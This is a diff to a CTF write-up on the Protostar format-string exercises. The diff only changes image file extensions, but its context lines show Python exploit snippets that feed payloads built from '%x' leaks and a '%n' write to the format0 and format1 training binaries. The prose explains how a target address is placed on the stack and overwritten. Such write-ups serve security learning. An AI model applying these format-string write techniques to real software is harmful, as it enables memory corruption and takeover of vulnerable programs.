@@ -13,7 +13,7 @@ print len(exploit), "bytes"
 subprocess.call(['/opt/protostar/bin/format0', exploit])
 ```
 
-![format0_2](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format0_2_2.PNG)
+![format0_2](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format0_2_2.png)
 
 We can get down to under 10 bytes if we use a buffering format string. Using %Xd will pad the string with X ints. We pad our exploit with 64 bytes to overflow to the variable we need to change.
 
@@ -59,7 +59,7 @@ exploit = "%x " * offset
 subprocess.call(['/opt/protostar/bin/format1', exploit])
 ```
 
-![format1_3](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format1_3_2.PNG)
+![format1_3](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format1_3_2.png)
 
 Looking at the leaked addresses we can't find 0x08049638. However we do see some repeating numbers near the end of the dump. If we look at those numbers in ascii we see that it is our '%x ' that we input. This means that we can put our target address onto the stack ourself. Now that we have the address we need to write to it. If we use %n we can write the current number of characters written so far to the address passed to it.
 
@@ -81,7 +81,7 @@ exploit = "\x38\x96\x04\x08" + "%x " * offset + "%n" + "A"*200
 subprocess.call(['/opt/protostar/bin/format1', exploit[:450]])
 ```
 
-![format1_8](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format1_8_2.PNG)
+![format1_8](https://github.com/kztoth/CTF_Writeup/blob/master/protostar/2%20-%20Format/pics/format1_8_2.png)
 
 As you can see we were able to change the value of target by writing it's address to the stack and then writing to it with %n.
 
